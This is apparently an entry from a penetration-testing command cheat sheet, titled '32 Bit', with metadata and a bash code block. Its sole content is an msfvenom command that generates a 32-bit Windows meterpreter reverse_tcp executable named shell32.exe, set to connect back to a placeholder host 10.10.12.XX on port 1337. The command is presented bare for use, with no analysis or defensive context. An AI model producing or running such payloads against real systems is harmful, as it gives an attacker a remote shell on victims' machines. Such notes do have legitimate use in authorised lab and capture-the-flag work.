---
id: 22fe7e00-b55f-4344-960c-f08929234583
name: 32 Bit
type: command
executor: bash
data: 'msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.12.XX
  lport=1337 -f exe > shell32.exe

  '
output: null
created_at: '2020-07-14T18:14:34.234247+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# 32 Bit

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.12.XX lport=1337 -f exe > shell32.exe

```
